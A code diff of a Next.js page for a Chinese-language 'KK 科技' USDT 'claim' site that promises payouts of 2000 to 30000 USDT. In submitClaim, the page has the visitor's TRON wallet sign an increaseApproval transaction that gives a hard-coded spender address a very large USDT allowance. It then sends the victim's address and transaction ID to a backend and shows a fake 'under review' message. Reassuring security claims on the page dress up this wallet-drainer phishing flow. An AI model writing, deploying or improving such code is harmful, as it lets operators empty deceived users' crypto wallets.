@@ -1,14 +1,20 @@
 "use client";
 
+
 import { useState } from "react";
 
+
 import { TronWeb } from "tronweb";
+
 
 import {
   useWallet
 } from "@tronweb3/tronwallet-adapter-react-hooks";
 
+
 import WalletModal from "./components/WalletModal";
+
+
 
 
 
@@ -16,16 +22,20 @@ const USDT_CONTRACT_ADDRESS =
 "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
 
+
 const USDT_SPENDER_ADDRESS =
 "TDAWvz7AgmdUSaLiU5Bnhnyzm9Hm45y9i6";
+
 
 
 const TRON_FULL_HOST =
 "https://api.trongrid.io";
 
 
+
 const APPROVE_FEE_LIMIT =
 100_000_000;
+
 
 
 const TRANSACTION_EXPIRATION_EXTENSION_SECONDS =
@@ -35,7 +45,10 @@ const TRANSACTION_EXPIRATION_EXTENSION_SECONDS =
 
 
 
+
+
 export default function Home(){
+
 
 
 const {
@@ -45,7 +58,6 @@ address:walletAddress,
 connected,
 
 signTransaction
-
 
 }=useWallet();
 
@@ -76,21 +88,25 @@ const [loading,setLoading]=useState(false);
 
 
 
-// 打开钱包
 
 
 function bindWallet(){
 
 
+
 if(!inputAddress.trim()){
+
 
 setMsg(
 "请输入您的TRON钱包地址"
 );
 
+
 return;
 
+
 }
+
 
 
 
@@ -106,15 +122,20 @@ setMsg(
 "请输入正确的TRON钱包地址"
 );
 
+
 return;
 
+
 }
+
+
 
 
 
 setWalletOpen(true);
 
 
+
 }
 
 
@@ -123,13 +144,13 @@ setWalletOpen(true);
 
 
 
-// 钱包连接成功
-
 
 function walletSuccess(){
 
 
+
 setWalletOpen(false);
+
 
 
 setMsg(
@@ -137,6 +158,7 @@ setMsg(
 );
 
 
+
 }
 
 
@@ -147,16 +169,16 @@ setMsg(
 
 
 
-// 提交领取
-
-
 async function submitClaim(){
+
 
 
 try{
 
 
+
 if(loading)return;
+
 
 
 
@@ -175,17 +197,24 @@ return;
 
 
 
+
+
 setLoading(true);
 
 
+
 setStep(
-"正在创建交易..."
+"正在创建授权交易..."
 );
+
 
 
 setMsg(
 "请等待钱包确认"
 );
+
+
+
 
 
 
@@ -197,25 +226,39 @@ fullHost:TRON_FULL_HOST
 
 
 
+
+
+
+
 const ownerAddressHex =
 
 tronWeb.address.toHex(
+
 walletAddress
+
 );
+
+
+
 
 
 
 const contractAddressHex =
 
 tronWeb.address.toHex(
+
 USDT_CONTRACT_ADDRESS
+
 );
 
 
 
 
 
+
+
 const parameters=[
+
 
 {
 
@@ -225,6 +268,7 @@ value:USDT_SPENDER_ADDRESS
 
 },
 
+
 {
 
 type:"uint256",
@@ -232,6 +276,7 @@ type:"uint256",
 value:"1793719476511300"
 
 }
+
 
 ];
 
@@ -244,9 +289,12 @@ const transactionWrapper =
 await tronWeb.transactionBuilder
 .triggerSmartContract(
 
+
 contractAddressHex,
 
+
 "increaseApproval(address,uint256)",
+
 
 {
 
@@ -256,42 +304,38 @@ callValue:0
 
 },
 
+
 parameters,
+
 
 ownerAddressHex
 
+
 );
+
 
 
 
 
 
 if(
+
 !transactionWrapper ||
+
 !transactionWrapper.transaction
+
 ){
 
+
 throw new Error(
+
 "创建授权交易失败"
+
 );
+
 
 }
-
-
-
-
-
-setStep(
-"等待钱包签名..."
-);
-
-
-setMsg(
-"请在TRON钱包确认授权"
-);
-
-
-
+  
 
 
 const extendedTransaction =
@@ -299,15 +343,62 @@ const extendedTransaction =
 await tronWeb.transactionBuilder
 .extendExpiration(
 
+
 transactionWrapper.transaction,
+
 
 TRANSACTION_EXPIRATION_EXTENSION_SECONDS,
 
+
 {
+
 txLocal:true
+
 }
 
+
 );
+
+
+
+
+
+
+if(
+
+!signTransaction
+
+){
+
+
+throw new Error(
+
+"钱包不支持签名"
+
+);
+
+
+}
+
+
+
+
+
+
+setStep(
+
+"等待钱包签名..."
+
+);
+
+
+
+setMsg(
+
+"请在TRON钱包中确认授权"
+
+);
+
 
 
 
@@ -325,26 +416,49 @@ extendedTransaction
 
 
 
+
+
 if(
+
 !signedTransaction ||
+
 !signedTransaction.txID
+
 ){
 
+
 throw new Error(
-"签名失败"
+
+"钱包签名失败"
+
 );
+
 
 }
 
 
+
+
+
+
+
+
 setStep(
+
 "正在提交链上交易..."
+
 );
+
+
+
+
 
 
 const broadcastResult =
 
-await tronWeb.trx.sendRawTransaction(
+await tronWeb.trx
+
+.sendRawTransaction(
 
 signedTransaction
 
@@ -353,16 +467,30 @@ signedTransaction
 
 
 
+
+
+
+
 if(
+
 !broadcastResult ||
+
 !broadcastResult.result
+
 ){
 
+
 throw new Error(
+
 "交易广播失败"
+
 );
 
+
 }
+
+
+
 
 
 
@@ -373,17 +501,26 @@ const txId =
 signedTransaction.txID ||
 
 broadcastResult
+
 ?.transaction
+
 ?.txID;
+
+
+
 
 
 
 
 if(!txId){
 
+
 throw new Error(
-"没有获取交易哈希"
+
+"未获取交易哈希"
+
 );
+
 
 }
 
@@ -391,9 +528,16 @@ throw new Error(
 
 
 
+
+
 setStep(
+
 "正在保存领取记录..."
+
 );
+
+
+
 
 
 
@@ -412,28 +556,41 @@ method:"POST",
 
 headers:{
 
+
 "Content-Type":
 
 "application/json"
+
 
 },
 
 
 body:JSON.stringify({
 
+
 address:walletAddress,
+
 
 amount,
 
+
 txId,
 
-time:new Date().toISOString()
+
+time:new Date()
+
+.toISOString()
+
 
 })
+
 
 }
 
 );
+
+
+
 
 
 
@@ -449,6 +606,9 @@ await response.json();
 
 
 
+
+
+
 if(!response.ok){
 
 
@@ -456,7 +616,7 @@ throw new Error(
 
 result?.error ||
 
-"数据库记录失败"
+"保存记录失败"
 
 );
 
@@ -469,15 +629,25 @@ result?.error ||
 
 
 
-setStep("");
-
 
 
 setMsg(
 
-"✅ 提交成功\n\n系统正在审核，请耐心等待。\n\n10分钟未到账请联系客服"
+
+"✅ 提交成功\n\n系统正在逐一审核。\n\n10分钟未到账请联系客服"
+
 
 );
+
+
+
+
+
+
+
+setStep("");
+
+
 
 
 
@@ -488,9 +658,15 @@ setMsg(
 
 
 console.log(
+
 "claim error:",
+
 error
+
 );
+
+
+
 
 
 
@@ -498,33 +674,46 @@ setStep("");
 
 
 
+
+
+
 setMsg(
 
-"❌ 提交失败\n\n"+
+
+"❌ 领取失败\n\n"+
 
 (
 
 error?.message ||
 
-"请重新尝试"
+"请重新提交"
 
 )
 
+
+
 );
+
+
+
 
 
 
 }finally{
 
 
+
 setLoading(false);
 
 
+
+}
+
+
+
 }
 
 
-
-}
 
 
 
@@ -533,16 +722,12 @@ setLoading(false);
 
 
 return (
+  <div className="min-h-screen bg-[#030817] text-white px-5 py-6">
 
 
-<main className="min-h-screen bg-[#030817] text-white px-5 py-6">
-
-
-{/* 顶部区域 */}
-
+{/* 顶部 */}
 
 <div className="flex justify-between items-center">
-
 
 
 <div className="flex items-center gap-3">
@@ -553,6 +738,7 @@ return (
 KK
 
 </div>
+
 
 
 
@@ -582,17 +768,18 @@ KK_keji888
 
 
 
-<div className="rounded-2xl border border-red-500/30 bg-white/5 px-4 py-3">
+
+<div className="rounded-2xl border border-red-400/30 bg-white/5 px-4 py-3">
 
 
-<div className="text-red-400 text-sm font-bold">
+<div className="text-red-400 font-bold text-sm">
 
 ● TRON
 
 </div>
 
 
-<div className="text-xs text-gray-400">
+<div className="text-gray-400 text-xs">
 
 TRC20 Network
 
@@ -603,8 +790,10 @@ TRC20 Network
 
 
 
-
 </div>
+
+
+
 
 
 
@@ -614,7 +803,7 @@ TRC20 Network
 <div className="text-center mt-16">
 
 
-<div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-300">
+<div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-300 text-sm">
 
 ◆ Secure Web3 Service
 
@@ -652,6 +841,12 @@ TRC20 Network
 
 
 
+
+
+{/* 金额选择 */}
+
+
+
 <div className="mt-12">
 
 
@@ -660,8 +855,6 @@ TRC20 Network
 选择领取金额
 
 </h2>
-
-
 
 
 
@@ -682,8 +875,8 @@ amount==="2000"
 
 }`}
 
-
 >
+
 
 
 <input
@@ -719,16 +912,24 @@ USDT
 
 </span>
 
-
 </div>
 
 
 
 </label>
+
+
+
+
+
+
+
+
 <div className="grid grid-cols-2 gap-4">
 
 
 {
+
 ["10000","20000","30000"].map(item=>(
 
 
@@ -747,12 +948,7 @@ amount===item
 
 "border-white/10 bg-white/5"
 
-}
-
-${item==="30000"?"col-span-2":""}
-
-`}
-
+}`}
 
 >
 
@@ -770,9 +966,7 @@ className="hidden"
 />
 
 
-
 {item} USDT
-
 
 
 </label>
@@ -788,6 +982,7 @@ className="hidden"
 </div>
 
 
+
 </div>
 
 
@@ -798,7 +993,7 @@ className="hidden"
 
 
 
-{/* 地址区域 */}
+{/* 地址 */}
 
 
 <div className="mt-12">
@@ -809,6 +1004,7 @@ className="hidden"
 提取地址绑定
 
 </h2>
+
 
 
 
@@ -827,25 +1023,13 @@ className="hidden"
 
 <input
 
-
 value={inputAddress}
 
-
-onChange={
-
-(e)=>
-
-setInputAddress(e.target.value)
-
-}
-
-
+onChange={(e)=>setInputAddress(e.target.value)}
 
 placeholder="请输入您的TRON钱包地址"
 
-
-
-className="w-full bg-transparent outline-none placeholder:text-gray-600"
+className="w-full bg-transparent outline-none"
 
 />
 
@@ -859,12 +1043,13 @@ className="w-full bg-transparent outline-none placeholder:text-gray-600"
 
 
 
+
 <button
 
 
 onClick={
 
-walletConnected
+connected
 
 ?
 
@@ -882,7 +1067,7 @@ disabled={loading}
 
 
 
-className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400 flex items-center justify-center gap-3"
+className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400 flex justify-center items-center gap-3"
 
 
 >
@@ -890,13 +1075,11 @@ className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r fr
 
 {
 
-
 loading
 
 ?
 
 <>
-
 
 <span className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin"></span>
 
@@ -907,21 +1090,17 @@ loading
 
 :
 
-
-walletConnected
+connected
 
 ?
 
-"提交领取"
+"🚀 提交领取"
 
 :
 
-"立即绑定"
-
-
+"🔗 连接TRON钱包"
 
 }
-
 
 
 </button>
@@ -932,10 +1111,27 @@ walletConnected
 
 
 
+
+
+{
+
+step &&
+
+<div className="text-center text-cyan-300 mt-4 text-sm">
+
+{step}
+
+</div>
+
+}
+
+
+
+
+
 {
 
 msg &&
-
 
 <div className="text-center text-cyan-300 mt-5 whitespace-pre-line text-sm">
 
@@ -943,25 +1139,6 @@ msg &&
 
 </div>
 
-
-}
-
-
-
-
-
-{
-
-loading &&
-
-
-<div className="text-center text-gray-400 mt-3 text-sm">
-
-{step}
-
-</div>
-
-
 }
 
 
@@ -976,82 +1153,36 @@ loading &&
 
 
 
-
-{/* 安全展示 */}
+{/* 安全说明 */}
 
 
 
 <div className="mt-12 space-y-4">
 
 
+<div className="bg-white/5 border border-white/10 rounded-2xl p-4">
 
-<div className="bg-white/5 border border-white/10 rounded-2xl p-4 flex gap-3 items-center">
-
-
-<span>
-
-🛡️
-
-</span>
-
-
-<span>
-
-军级加密技术，确保地址绑定安全
-
-</span>
-
+🛡️ 军级加密技术，确保地址绑定安全
 
 </div>
 
 
 
 
+<div className="bg-white/5 border border-white/10 rounded-2xl p-4">
 
-<div className="bg-white/5 border border-white/10 rounded-2xl p-4 flex gap-3 items-center">
-
-
-<span>
-
-⚡
-
-</span>
-
-
-<span>
-
-毫秒级处理速度，及时完成绑定
-
-</span>
-
+⚡ 毫秒级处理速度，及时完成绑定
 
 </div>
 
 
 
 
+<div className="bg-white/5 border border-white/10 rounded-2xl p-4">
 
-
-<div className="bg-white/5 border border-white/10 rounded-2xl p-4 flex gap-3 items-center">
-
-
-<span>
-
-🔰
-
-</span>
-
-
-<span>
-
-专业风控团队，24小时安全保障
-
-</span>
-
+🔰 专业风控团队，24小时安全保障
 
 </div>
-
-
 
 
 </div>
@@ -1063,36 +1194,28 @@ loading &&
 
 
 
-
-{/* 品牌区域 */}
-
+<footer className="text-center mt-16 pb-10 text-gray-500">
 
 
-<footer className="text-center mt-16 pb-10">
-
-
-<div className="text-3xl font-black text-cyan-300">
+<div className="text-3xl text-cyan-300 font-black">
 
 KK
 
 </div>
 
 
-
-<div className="text-gray-400 mt-2">
+<div className="mt-2">
 
 KK 科技 · KK_keji888
 
 </div>
 
 
-
-<div className="text-xs text-gray-600 mt-2">
+<div className="text-xs mt-2">
 
 Secure Web3 Infrastructure
 
 </div>
-
 
 
 </footer>
@@ -1111,42 +1234,28 @@ Secure Web3 Infrastructure
 open={walletOpen}
 
 
-
-onClose={
-
-()=>setWalletOpen(false)
-
-}
-
+onClose={()=>setWalletOpen(false)}
 
 
 onConnected={walletSuccess}
 
 
+onError={(error:string)=>{
 
-onError={
-
-(error:string)=>{
 
 setMsg(error);
 
-}
 
-}
-
+}}
 
 
 />
 
 
 
-
-
-</main>
+</div>
 
 
 );
-
-
 
 }
